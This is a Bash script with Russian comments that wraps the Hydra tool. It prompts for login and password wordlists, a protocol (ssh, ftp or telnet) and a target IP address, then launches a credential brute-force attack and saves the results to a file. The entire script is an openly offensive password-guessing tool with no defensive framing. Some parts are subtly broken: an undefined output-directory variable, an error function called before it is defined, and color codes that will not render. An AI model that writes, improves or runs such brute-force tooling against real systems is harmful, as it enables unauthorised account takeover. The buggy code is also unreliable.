# Проверка наличия утилиты Hydra
NORMAL='\033[0m'      #  ${NORMAL}    # все атрибуты по умолчанию
DEF='\033[0;39m'       #  ${DEF}
DGRAY='\033[1;30m'     #  ${DGRAY}
LRED='\033[1;31m'       #  ${LRED}
LGREEN='\033[1;32m'     #  ${LGREEN}
LYELLOW='\033[1;33m'     #  ${LYELLOW}
LBLUE='\033[1;34m'     #  ${LBLUE}
LMAGENTA='\033[1;35m'   #  ${LMAGENTA}
LCYAN='\033[1;36m'     #  ${LCYAN}
WHITE='\033[1;37m'     #  ${WHITE}
green='\e[1;32m' # ${green}

if ! command -v hydra &> /dev/null; then
    echo "$LRED Hydra is not installed. Please install it before using this script.$NORMAL"
    exit 1
fi


output_directory="outputs"
output_file="bruter_out.txt"


# Создание директории, если она не существует
mkdir -p "$output_dir" || error_exit "Failed to create output directory: $output_dir"

# Функция для вывода сообщения об ошибке и выхода из скрипта
function error_exit {
    echo "$LRED Error: $1$NORMAL"
    exit 1
}

# Запрос пути к файлам с логинами и паролями
read -p "$LMAGENTA[$NORMAL$LCYAN+$LMAGENTA]$NORMAL$WHITE Enter path to the login file: $NORMAL" login_file
read -p "$LMAGENTA[$NORMAL$LCYAN+$LMAGENTA]$NORMAL$WHITE Enter path to the password file: $NORMAL" password_file

# Проверка существования файлов с логинами и паролями
[ -f "$login_file" ] || error_exit "Login file not found: $login_file"
[ -f "$password_file" ] || error_exit "Password file not found: $password_file"

# Запрос протокола и цели
read -p "$LMAGENTA[$NORMAL$LCYAN+$LMAGENTA]$NORMAL$WHITE Enter the protocol $LYELLOW (ssh, ftp, telnet)$NORMAL$WHITE: $NORMAL" protocol
read -p "$LMAGENTA[$NORMAL$LCYAN+$LMAGENTA]$NORMAL$WHITE Enter the target $LYELLOW (IP address)$NORMAL$WHITE: $NORMAL" target

# Запуск Hydra для брутфорса
echo "$LYELLOW Bruteforce starting...$NORMAL"
hydra -f -L "$login_file" -P "$password_file" -o "$output_directory/$output_file" -e ns -v "$protocol://$target"
echo "                                                        "
echo "$LGREEN BruteForce End! Results have been saved to $output_file.$NORMAL"
echo "                                                        "
